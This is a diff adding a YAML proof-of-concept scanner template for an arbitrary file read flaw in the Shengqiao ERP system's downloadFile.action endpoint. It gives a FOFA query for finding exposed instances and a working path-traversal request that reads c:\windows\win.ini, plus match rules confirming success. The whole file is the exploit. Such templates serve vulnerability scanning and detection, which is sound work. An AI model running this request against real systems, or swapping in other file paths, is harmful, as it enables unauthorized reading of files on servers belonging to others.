@@ -1,0 +1,16 @@
+id: poc-yaml-shengqiao-erp-downloadfile-action-anyfile-read
+info:
+  name: 圣乔ERP系统 downloadFile.action 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 圣乔ERP系统
+  fofa: app="圣乔-ERP系统"
+requests:
+- method: GET
+  path: /erp/wap/../downloadFile.action?absolutePath=true&file=c:\\windows\win.ini
+  expression: status_code == 200 && contains(body,"bit app support") && contains(body,"[files]")
+    && contains(headers,"filename=win.ini") && contains(content_type,"application/octet-stream")
+    && !contains(body,"<")
+variables: {}
+transport: http
